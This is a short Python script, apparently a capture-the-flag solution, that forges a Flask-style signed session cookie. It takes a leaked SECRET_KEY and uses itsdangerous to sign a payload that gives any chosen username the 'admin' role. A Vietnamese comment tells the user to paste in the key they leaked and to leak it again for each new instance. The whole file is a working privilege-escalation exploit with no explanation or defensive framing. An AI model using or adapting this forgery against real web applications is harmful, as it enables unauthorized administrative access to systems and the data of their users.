#!/usr/bin/env python3
import json, hashlib
from itsdangerous import URLSafeTimedSerializer

# Thay bằng SECRET_KEY bạn đã leak, mỗi lần tạo 1 instane mới sẽ phải leak lại
SECRET_KEY = "59da63ac832041d1919618adbfa86bbc0a69449da1b97119c82a3163fa7360c0f7b6346ec828543012178ab6609b5e532d8b"  

def make_admin_session(username="you"):
    serializer = URLSafeTimedSerializer(
        SECRET_KEY,
        salt='cookie-session',
        serializer=json,
        signer_kwargs={'key_derivation':'hmac','digest_method':hashlib.sha1}
    )
    data = {'user': {'username': username, 'role': 'admin'}}
    return serializer.dumps(data)

if __name__ == "__main__":
    import sys
    user = sys.argv[1] if len(sys.argv) > 1 else "you"
    cookie = make_admin_session(user)
    print(cookie)
